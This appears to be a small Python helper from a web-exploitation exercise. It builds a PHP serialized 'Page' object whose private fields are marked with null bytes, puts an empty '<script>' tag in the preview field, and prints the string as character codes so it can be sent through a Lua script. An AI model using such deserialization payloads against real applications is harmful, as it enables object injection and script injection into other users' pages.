"""
Prints out the char array for the lua script.
Since curl has issues with sending/receiving null bytes, we can avoid using them by using lua scripts.
"""

destination_url = "http://yahoo.com"
title = "MY TITLEEEE"
preview = "<script></script>"
mystr = f"O:4:\"Page\":3:{{s:3:\"url\";s:{len(destination_url)}:\"{destination_url}\";s:11:\"\x00Page\x00title\";s:{len(title)}:\"{title}\";s:13:\"\x00Page\x00preview\";s:{len(preview)}:\"{preview}\";}}"

for i in range(len(mystr)):
    print(ord(mystr[i]), end=',')

